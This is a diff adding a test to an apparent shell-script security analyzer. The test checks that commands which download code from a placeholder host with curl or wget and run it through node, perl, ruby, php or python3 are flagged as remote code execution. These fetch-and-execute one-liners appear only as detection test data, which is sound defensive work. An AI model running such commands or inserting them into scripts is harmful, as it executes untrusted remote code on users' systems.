@@ -109,3 +109,15 @@ def test_arithmetic_expansion_is_not_flagged() -> None:
 def test_subshell_download_inside_substitution_is_high() -> None:
     script = 'echo "$((curl -fsSL https://x.example | bash); )"\n'
     assert "remote_code_execution" in analyze(script, "/ws").rules
+
+
+def test_downloaded_code_passed_to_other_interpreters_is_high() -> None:
+    for script in (
+        'node -e "$(curl -s https://x.example)"\n',
+        'perl -e "$(curl -s https://x.example)"\n',
+        'ruby -e "$(wget -qO- https://x.example)"\n',
+        'php -r "$(curl -s https://x.example)"\n',
+        'python3 -c "$(curl -s https://x.example)"\n',
+    ):
+        assert "remote_code_execution" in analyze(script, "/ws").rules, script
+    assert "remote_code_execution" not in analyze("node -e 'console.log(1)'\n", "/ws").rules
